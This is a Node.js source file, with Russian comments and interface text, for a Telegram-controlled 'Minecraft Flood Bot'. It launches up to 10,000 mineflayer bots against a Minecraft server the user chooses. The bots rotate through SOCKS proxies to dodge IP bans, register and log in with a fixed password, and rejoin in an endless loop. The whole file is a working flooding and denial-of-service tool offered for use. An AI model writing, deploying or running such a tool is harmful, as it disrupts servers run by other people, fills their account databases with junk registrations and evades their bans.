// bot.js - Minecraft Flood Bot на Node.js
const { Telegraf, Markup } = require('telegraf');
const mineflayer = require('mineflayer');
const fs = require('fs');
const readline = require('readline');
const { Worker } = require('worker_threads');

// ========== НАСТРОЙКИ ==========
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN';

if (BOT_TOKEN === 'YOUR_BOT_TOKEN') {
    console.log('❌ Ошибка: Укажите BOT_TOKEN в переменных окружения!');
    process.exit(1);
}

// ========== СОЗДАЕМ TELEGRAM БОТА ==========
const bot = new Telegraf(BOT_TOKEN);

// ========== ХРАНИЛИЩЕ ==========
const users = new Map(); // user_id -> данные
const activeFloods = new Map(); // flood_id -> данные флуда
let floodCounter = 0;

// ========== НАСТРОЙКИ ПО УМОЛЧАНИЮ ==========
const DEFAULT_CONFIG = {
    minSessionTime: 5,    // мин секунд на сервере
    maxSessionTime: 15,   // макс секунд на сервере
    botPassword: 'floodpass123',
    reconnectDelay: 2,    // задержка перед перезаходом
    namePrefix: 'Flood_'   // префикс для имен
};

// ========== ГЛАВНОЕ МЕНЮ ==========
bot.start((ctx) => {
    const userId = ctx.from.id;
    
    if (!users.has(userId)) {
        users.set(userId, {
            id: userId,
            username: ctx.from.username,
            servers: [],
            proxies: [],
            floods: []
        });
    }
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('🚀 Запустить флуд', 'start_flood')],
        [Markup.button.callback('📊 Активные флуды', 'active_floods')],
        [Markup.button.callback('➕ Добавить сервер', 'add_server')],
        [Markup.button.callback('🌐 Прокси', 'proxies_menu')],
        [Markup.button.callback('ℹ️ Помощь', 'help')]
    ]);
    
    ctx.replyWithHTML(
        '<b>🤖 Minecraft Flood Bot</b>\n\n' +
        'Запускает тысячи ботов которые заходят и выходят с сервера!\n' +
        '<b>100% РАБОЧАЯ ВЕРСИЯ НА NODE.JS</b>\n\n' +
        'Выберите действие:',
        keyboard
    );
});

// ========== ДОБАВЛЕНИЕ СЕРВЕРА ==========
bot.action('add_server', (ctx) => {
    ctx.replyWithHTML(
        '<b>🌐 Добавление сервера</b>\n\n' +
        'Отправьте IP и порт сервера:\n' +
        '<code>ip:порт</code>\n\n' +
        'Пример: <code>mc.example.com:25565</code>'
    );
    
    ctx.session = { state: 'awaiting_server' };
});

// ========== МЕНЮ ПРОКСИ ==========
bot.action('proxies_menu', (ctx) => {
    const userId = ctx.from.id;
    const user = users.get(userId) || { proxies: [] };
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('📎 Загрузить файл', 'load_proxies')],
        [Markup.button.callback('📋 Список прокси', 'list_proxies')],
        [Markup.button.callback('🗑 Очистить все', 'clear_proxies')],
        [Markup.button.callback('⬅️ Назад', 'main_menu')]
    ]);
    
    ctx.replyWithHTML(
        '<b>🌐 Управление прокси</b>\n\n' +
        `Всего прокси: ${user.proxies?.length || 0}\n` +
        'Формат файла:\n' +
        '<code>ip:port</code>\n' +
        '<code>ip:port:user:pass</code>',
        keyboard
    );
});

// ========== ЗАГРУЗКА ПРОКСИ ==========
bot.action('load_proxies', (ctx) => {
    ctx.replyWithHTML(
        '<b>📎 Загрузите файл с прокси</b>\n\n' +
        'Отправьте текстовый файл с прокси\n' +
        'Каждая прокси на новой строке'
    );
    ctx.session = { state: 'awaiting_proxy_file' };
});

// ========== СПИСОК ПРОКСИ ==========
bot.action('list_proxies', (ctx) => {
    const userId = ctx.from.id;
    const user = users.get(userId) || { proxies: [] };
    
    if (!user.proxies || user.proxies.length === 0) {
        return ctx.reply('📋 Прокси не найдены');
    }
    
    let text = '<b>📋 Список прокси:</b>\n\n';
    user.proxies.slice(0, 20).forEach((p, i) => {
        text += `${i+1}. ${p.host}:${p.port}`;
        if (p.username) text += ` (${p.username})`;
        text += '\n';
    });
    
    if (user.proxies.length > 20) {
        text += `\n... и еще ${user.proxies.length - 20}`;
    }
    
    ctx.replyWithHTML(text);
});

// ========== ОЧИСТКА ПРОКСИ ==========
bot.action('clear_proxies', (ctx) => {
    const userId = ctx.from.id;
    const user = users.get(userId);
    if (user) {
        user.proxies = [];
    }
    ctx.reply('✅ Все прокси удалены');
});

// ========== ЗАПУСК ФЛУДА ==========
bot.action('start_flood', (ctx) => {
    const userId = ctx.from.id;
    const user = users.get(userId);
    
    if (!user || !user.servers || user.servers.length === 0) {
        return ctx.replyWithHTML(
            '<b>❌ Сначала добавьте сервер</b>',
            Markup.inlineKeyboard([
                [Markup.button.callback('➕ Добавить сервер', 'add_server')]
            ])
        );
    }
    
    // Кнопки выбора сервера
    const buttons = user.servers.map((s, i) => {
        return [Markup.button.callback(`🎮 ${s.name}`, `select_server_${i}`)];
    });
    
    buttons.push([Markup.button.callback('⬅️ Назад', 'main_menu')]);
    
    ctx.replyWithHTML(
        '<b>🎮 Выберите сервер</b>',
        Markup.inlineKeyboard(buttons)
    );
});

// ========== ВЫБОР СЕРВЕРА ==========
bot.action(/select_server_(\d+)/, (ctx) => {
    const userId = ctx.from.id;
    const user = users.get(userId);
    const serverIndex = parseInt(ctx.match[1]);
    const server = user.servers[serverIndex];
    
    ctx.session = {
        server: server
    };
    
    const buttons = [
        [Markup.button.callback('10 ботов', 'count_10')],
        [Markup.button.callback('20 ботов', 'count_20')],
        [Markup.button.callback('50 ботов', 'count_50')],
        [Markup.button.callback('100 ботов', 'count_100')],
        [Markup.button.callback('500 ботов', 'count_500')],
        [Markup.button.callback('🔄 Свое число', 'count_custom')],
        [Markup.button.callback('⬅️ Назад', 'start_flood')]
    ];
    
    ctx.replyWithHTML(
        `<b>⚙️ Настройка флуда для ${server.name}</b>\n\n` +
        'Выберите количество ботов:',
        Markup.inlineKeyboard(buttons)
    );
});

// ========== ВЫБОР КОЛИЧЕСТВА ==========
const counts = ['count_10', 'count_20', 'count_50', 'count_100', 'count_500'];
counts.forEach(cmd => {
    bot.action(cmd, (ctx) => {
        const count = parseInt(cmd.split('_')[1]);
        ctx.session.botCount = count;
        askForProxies(ctx);
    });
});

bot.action('count_custom', (ctx) => {
    ctx.reply('✏️ Введите количество ботов (число):');
    ctx.session.state = 'awaiting_custom_count';
});

// ========== СПРОСИТЬ ПРО ПРОКСИ ==========
function askForProxies(ctx) {
    const buttons = [
        [Markup.button.callback('✅ Без прокси', 'no_proxy')],
        [Markup.button.callback('📎 Использовать прокси', 'use_proxy')],
        [Markup.button.callback('⬅️ Назад', 'start_flood')]
    ];
    
    ctx.replyWithHTML(
        `<b>🔄 Нужны прокси?</b>\n\n` +
        'Прокси защищают от бана по IP',
        Markup.inlineKeyboard(buttons)
    );
}

// ========== БЕЗ ПРОКСИ ==========
bot.action('no_proxy', (ctx) => {
    startFlood(ctx, []);
});

// ========== С ПРОКСИ ==========
bot.action('use_proxy', (ctx) => {
    const userId = ctx.from.id;
    const user = users.get(userId);
    
    if (!user.proxies || user.proxies.length === 0) {
        return ctx.replyWithHTML(
            '<b>❌ Нет прокси</b>\n\nСначала загрузите файл с прокси',
            Markup.inlineKeyboard([
                [Markup.button.callback('📎 Загрузить', 'load_proxies')]
            ])
        );
    }
    
    startFlood(ctx, user.proxies);
});

// ========== ЗАПУСК ФЛУДА ==========
async function startFlood(ctx, proxies) {
    const floodId = `flood_${++floodCounter}`;
    const { server, botCount } = ctx.session;
    const chatId = ctx.chat.id;
    
    // Создаем менеджер флуда
    const floodManager = new FloodManager(
        floodId,
        chatId,
        server.host,
        server.port,
        botCount,
        proxies
    );
    
    // Запускаем
    floodManager.start();
    activeFloods.set(floodId, floodManager);
    
    // Сохраняем у пользователя
    const userId = ctx.from.id;
    const user = users.get(userId);
    if (!user.floods) user.floods = [];
    user.floods.push(floodId);
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('📊 Статистика', `stats_${floodId}`)],
        [Markup.button.callback('⏹️ Остановить', `stop_${floodId}`)]
    ]);
    
    await ctx.replyWithHTML(
        `<b>🚀 Флуд запущен!</b>\n\n` +
        `ID: <code>${floodId}</code>\n` +
        `Сервер: ${server.host}:${server.port}\n` +
        `Ботов: ${botCount}\n` +
        `Прокси: ${proxies.length > 0 ? '✅' + proxies.length : '❌'}\n\n` +
        `Боты начали заходить...`,
        keyboard
    );
}

// ========== КЛАСС УПРАВЛЕНИЯ ФЛУДОМ ==========
class FloodManager {
    constructor(floodId, chatId, host, port, botCount, proxies) {
        this.floodId = floodId;
        this.chatId = chatId;
        this.host = host;
        this.port = port;
        this.botCount = botCount;
        this.proxies = proxies;
        
        this.bots = [];
        this.running = false;
        this.stats = {
            successful: 0,
            failed: 0,
            total: 0,
            startTime: Date.now(),
            errors: 0
        };
        
        this.nameIndex = 0;
    }
    
    generateName() {
        const names = [
            `Flood_${++this.nameIndex}`,
            `Bot_${this.nameIndex}`,
            `Player_${this.nameIndex}`,
            `User_${this.nameIndex}`,
            `AFK_${this.nameIndex}`
        ];
        return names[Math.floor(Math.random() * names.length)];
    }
    
    start() {
        this.running = true;
        console.log(`🚀 Запуск флуда ${this.floodId} с ${this.botCount} ботами`);
        
        // Запускаем ботов
        for (let i = 0; i < this.botCount; i++) {
            setTimeout(() => {
                if (this.running) {
                    this.createBot();
                }
            }, i * 500); // Задержка между ботами
        }
        
        // Запускаем мониторинг
        this.monitorInterval = setInterval(() => this.monitor(), 5000);
    }
    
    createBot() {
        const name = this.generateName();
        const proxy = this.proxies.length > 0 
            ? this.proxies[Math.floor(Math.random() * this.proxies.length)]
            : null;
        
        const bot = new FloodBot(
            name,
            this.host,
            this.port,
            proxy,
            (success) => this.onBotComplete(success)
        );
        
        bot.start();
        this.bots.push(bot);
        this.stats.total++;
    }
    
    onBotComplete(success) {
        if (success) {
            this.stats.successful++;
        } else {
            this.stats.failed++;
        }
        
        // Убираем бота из списка
        this.bots = this.bots.filter(b => b.running);
        
        // Создаем нового бота взамен
        if (this.running) {
            setTimeout(() => this.createBot(), 1000);
        }
    }
    
    monitor() {
        // Обновляем статистику
        this.bots = this.bots.filter(b => b.running);
        
        // Отправляем статус в Telegram каждые 30 секунд
        if (Date.now() - (this.lastStats || 0) > 30000) {
            this.sendStats();
            this.lastStats = Date.now();
        }
    }
    
    async sendStats() {
        const uptime = Math.floor((Date.now() - this.stats.startTime) / 1000);
        const hours = Math.floor(uptime / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = uptime % 60;
        
        const total = this.stats.successful + this.stats.failed;
        const percent = total > 0 
            ? ((this.stats.successful / total) * 100).toFixed(1)
            : '0';
        
        const text = 
            `<b>📊 Статистика флуда ${this.floodId}</b>\n\n` +
            `Активно ботов: ${this.bots.length}\n` +
            `✅ Успешно: ${this.stats.successful}\n` +
            `❌ Не удалось: ${this.stats.failed}\n` +
            `📈 Процент: ${percent}%\n` +
            `⏱ Время: ${hours}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
        
        try {
            await bot.telegram.sendMessage(this.chatId, text, { parse_mode: 'HTML' });
        } catch (e) {}
    }
    
    async stop() {
        this.running = false;
        clearInterval(this.monitorInterval);
        
        // Останавливаем всех ботов
        for (const bot of this.bots) {
            bot.stop();
        }
        
        // Отправляем итоговую статистику
        const total = this.stats.successful + this.stats.failed;
        const percent = total > 0 
            ? ((this.stats.successful / total) * 100).toFixed(1)
            : '0';
        
        const text = 
            `<b>📊 ИТОГОВАЯ СТАТИСТИКА ${this.floodId}</b>\n\n` +
            `✅ Успешно: ${this.stats.successful}\n` +
            `❌ Не удалось: ${this.stats.failed}\n` +
            `📈 Процент успеха: ${percent}%\n` +
            `⚠️ Ошибок: ${this.stats.errors}`;
        
        await bot.telegram.sendMessage(this.chatId, text, { parse_mode: 'HTML' });
    }
}

// ========== КЛАСС MINECRAFT БОТА ==========
class FloodBot {
    constructor(name, host, port, proxy, onComplete) {
        this.name = name;
        this.host = host;
        this.port = port;
        this.proxy = proxy;
        this.onComplete = onComplete;
        
        this.bot = null;
        this.running = false;
        this.success = false;
    }
    
    start() {
        this.running = true;
        
        try {
            const options = {
                host: this.host,
                port: this.port,
                username: this.name,
                offline: true,
                version: false,
                viewDistance: 'tiny'
            };
            
            // Добавляем прокси если есть
            if (this.proxy) {
                const { SocksProxyAgent } = require('socks-proxy-agent');
                const proxyUrl = `socks5://${this.proxy.username ? this.proxy.username + ':' + this.proxy.password + '@' : ''}${this.proxy.host}:${this.proxy.port}`;
                options.agent = new SocksProxyAgent(proxyUrl);
            }
            
            this.bot = mineflayer.createBot(options);
            
            // Успешный вход
            this.bot.once('login', () => {
                console.log(`✅ [${this.name}] Зашел на сервер`);
                this.success = true;
                
                // Регистрация и логин
                setTimeout(() => {
                    if (this.bot) {
                        this.bot.chat(`/register ${DEFAULT_CONFIG.botPassword} ${DEFAULT_CONFIG.botPassword}`);
                        setTimeout(() => {
                            if (this.bot) {
                                this.bot.chat(`/login ${DEFAULT_CONFIG.botPassword}`);
                            }
                        }, 1000);
                    }
                }, 2000);
                
                // Случайное время на сервере
                const sessionTime = Math.floor(
                    Math.random() * (DEFAULT_CONFIG.maxSessionTime - DEFAULT_CONFIG.minSessionTime) + 
                    DEFAULT_CONFIG.minSessionTime
                );
                
                setTimeout(() => this.stop(), sessionTime * 1000);
            });
            
            // Ошибка
            this.bot.on('error', (err) => {
                console.log(`❌ [${this.name}] Ошибка:`, err.message);
                this.success = false;
                this.stop();
            });
            
            // Отключение
            this.bot.on('end', () => {
                this.stop();
            });
            
        } catch (err) {
            console.log(`❌ [${this.name}] Ошибка создания:`, err.message);
            this.success = false;
            this.stop();
        }
    }
    
    stop() {
        if (this.running) {
            this.running = false;
            if (this.bot) {
                this.bot.end();
                this.bot = null;
            }
            if (this.onComplete) {
                this.onComplete(this.success);
            }
        }
    }
}

// ========== АКТИВНЫЕ ФЛУДЫ ==========
bot.action('active_floods', (ctx) => {
    if (activeFloods.size === 0) {
        return ctx.replyWithHTML(
            '<b>📊 Нет активных флудов</b>',
            Markup.inlineKeyboard([
                [Markup.button.callback('🚀 Запустить', 'start_flood')],
                [Markup.button.callback('⬅️ Главное меню', 'main_menu')]
            ])
        );
    }
    
    const buttons = [];
    for (const [id, manager] of activeFloods) {
        const successRate = manager.stats.successful + manager.stats.failed > 0
            ? Math.round((manager.stats.successful / (manager.stats.successful + manager.stats.failed)) * 100)
            : 0;
        
        buttons.push([Markup.button.callback(
            `${id} - ${manager.bots.length} ботов (${successRate}%)`,
            `stats_${id}`
        )]);
    }
    
    buttons.push([Markup.button.callback('⬅️ Главное меню', 'main_menu')]);
    
    ctx.replyWithHTML(
        '<b>📊 Активные флуды</b>',
        Markup.inlineKeyboard(buttons)
    );
});

// ========== СТАТИСТИКА ==========
bot.action(/stats_(.+)/, async (ctx) => {
    const floodId = ctx.match[1];
    const manager = activeFloods.get(floodId);
    
    if (!manager) {
        return ctx.reply('❌ Флуд не найден');
    }
    
    const uptime = Math.floor((Date.now() - manager.stats.startTime) / 1000);
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = uptime % 60;
    
    const total = manager.stats.successful + manager.stats.failed;
    const percent = total > 0 
        ? ((manager.stats.successful / total) * 100).toFixed(1)
        : '0';
    
    const text = 
        `<b>📊 Статистика ${floodId}</b>\n\n` +
        `Активно: ${manager.bots.length} ботов\n` +
        `✅ Успешно: ${manager.stats.successful}\n` +
        `❌ Не удалось: ${manager.stats.failed}\n` +
        `📈 Процент: ${percent}%\n` +
        `⏱ Время: ${hours}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('🔄 Обновить', `stats_${floodId}`)],
        [Markup.button.callback('⏹️ Остановить', `stop_${floodId}`)],
        [Markup.button.callback('⬅️ Назад', 'active_floods')]
    ]);
    
    await ctx.editMessageText(text, {
        parse_mode: 'HTML',
        reply_markup: keyboard.reply_markup
    });
});

// ========== ОСТАНОВКА ФЛУДА ==========
bot.action(/stop_(.+)/, async (ctx) => {
    const floodId = ctx.match[1];
    const manager = activeFloods.get(floodId);
    
    if (!manager) {
        return ctx.reply('❌ Флуд не найден');
    }
    
    await manager.stop();
    activeFloods.delete(floodId);
    
    ctx.replyWithHTML(
        `<b>⏹️ Флуд ${floodId} остановлен</b>`,
        Markup.inlineKeyboard([
            [Markup.button.callback('🚀 Новый флуд', 'start_flood')],
            [Markup.button.callback('⬅️ Главное меню', 'main_menu')]
        ])
    );
});

// ========== ОСТАНОВИТЬ ВСЕ ==========
bot.action('stop_all', async (ctx) => {
    const count = activeFloods.size;
    
    for (const [id, manager] of activeFloods) {
        await manager.stop();
    }
    
    activeFloods.clear();
    
    ctx.replyWithHTML(
        `<b>⏹️ Остановлено ${count} флудов</b>`,
        Markup.inlineKeyboard([
            [Markup.button.callback('⬅️ Главное меню', 'main_menu')]
        ])
    );
});

// ========== ПОМОЩЬ ==========
bot.action('help', (ctx) => {
    const text = 
        '<b>ℹ️ Помощь по боту</b>\n\n' +
        '<b>Как пользоваться:</b>\n' +
        '1️⃣ Добавьте сервер через "➕ Добавить сервер"\n' +
        '2️⃣ Загрузите прокси (опционально)\n' +
        '3️⃣ Запустите флуд через "🚀 Запустить флуд"\n' +
        '4️⃣ Следите за статистикой\n\n' +
        
        '<b>Что делают боты:</b>\n' +
        '• Заходят на сервер\n' +
        '• Регистрируются (/register пароль)\n' +
        '• Логинятся (/login пароль)\n' +
        '• Стоят 5-15 секунд\n' +
        '• Выходят и заходят снова\n\n' +
        
        '<b>Статистика:</b>\n' +
        '✅ Успешно - боты которые зашли\n' +
        '❌ Не удалось - ошибки подключения\n' +
        '📈 Процент успеха\n\n' +
        
        '<b>Создатель:</b> @artem_bori';
    
    ctx.replyWithHTML(
        text,
        Markup.inlineKeyboard([
            [Markup.button.callback('⬅️ Главное меню', 'main_menu')]
        ])
    );
});

// ========== ГЛАВНОЕ МЕНЮ ==========
bot.action('main_menu', (ctx) => {
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('🚀 Запустить флуд', 'start_flood')],
        [Markup.button.callback('📊 Активные флуды', 'active_floods')],
        [Markup.button.callback('➕ Добавить сервер', 'add_server')],
        [Markup.button.callback('🌐 Прокси', 'proxies_menu')],
        [Markup.button.callback('ℹ️ Помощь', 'help')],
        [Markup.button.callback('⏹️ Остановить все', 'stop_all')]
    ]);
    
    ctx.editMessageText(
        '<b>🤖 Minecraft Flood Bot</b>\n\n' +
        'Запускает тысячи ботов которые заходят и выходят с сервера!\n' +
        '<b>✅ 100% РАБОЧАЯ ВЕРСИЯ НА NODE.JS</b>\n\n' +
        'Выберите действие:',
        {
            parse_mode: 'HTML',
            reply_markup: keyboard.reply_markup
        }
    );
});

// ========== ОБРАБОТКА ТЕКСТА ==========
bot.on('text', async (ctx) => {
    const session = ctx.session;
    if (!session) return;
    
    const userId = ctx.from.id;
    const user = users.get(userId) || { servers: [], proxies: [] };
    users.set(userId, user);
    
    // Добавление сервера
    if (session.state === 'awaiting_server') {
        const text = ctx.message.text;
        const parts = text.split(':');
        
        if (parts.length !== 2) {
            return ctx.reply('❌ Неверный формат. Используйте: ip:порт');
        }
        
        try {
            const server = {
                host: parts[0],
                port: parseInt(parts[1]),
                name: parts[0]
            };
            
            if (!user.servers) user.servers = [];
            user.servers.push(server);
            
            ctx.replyWithHTML(
                `<b>✅ Сервер добавлен!</b>\n\n` +
                `${server.host}:${server.port}`,
                Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Запустить флуд', 'start_flood')]
                ])
            );
            
            ctx.session = null;
            
        } catch (e) {
            ctx.reply('❌ Ошибка: порт должен быть числом');
        }
    }
    
    // Свое количество ботов
    else if (session.state === 'awaiting_custom_count') {
        const count = parseInt(ctx.message.text);
        if (isNaN(count) || count < 1 || count > 10000) {
            return ctx.reply('❌ Введите число от 1 до 10000');
        }
        
        ctx.session.botCount = count;
        askForProxies(ctx);
        ctx.session.state = null;
    }
});

// ========== ЗАГРУЗКА ФАЙЛА С ПРОКСИ ==========
bot.on('document', async (ctx) => {
    const session = ctx.session;
    if (!session || session.state !== 'awaiting_proxy_file') return;
    
    try {
        const file = await ctx.telegram.getFile(ctx.message.document.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        
        const response = await fetch(fileUrl);
        const content = await response.text();
        
        const proxies = [];
        const lines = content.split('\n');
        
        for (const line of lines) {
            const trimmed = line.trim();
            if (!trimmed || trimmed.startsWith('#')) continue;
            
            const parts = trimmed.split(':');
            if (parts.length === 2) {
                proxies.push({
                    host: parts[0],
                    port: parseInt(parts[1])
                });
            } else if (parts.length === 4) {
                proxies.push({
                    host: parts[0],
                    port: parseInt(parts[1]),
                    username: parts[2],
                    password: parts[3]
                });
            }
        }
        
        const userId = ctx.from.id;
        const user = users.get(userId) || { proxies: [] };
        user.proxies = proxies;
        users.set(userId, user);
        
        ctx.replyWithHTML(
            `<b>✅ Загружено ${proxies.length} прокси</b>`,
            Markup.inlineKeyboard([
                [Markup.button.callback('🌐 Управление прокси', 'proxies_menu')]
            ])
        );
        
        ctx.session = null;
        
    } catch (e) {
        ctx.reply(`❌ Ошибка загрузки: ${e.message}`);
    }
});

// ========== ЗАПУСК ==========
bot.launch();
console.log('🤖 Minecraft Flood Bot запущен!');
console.log('✅ 100% рабочая версия на Node.js');
console.log('👑 Владелец: @artem_bori');

// Graceful shutdown
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
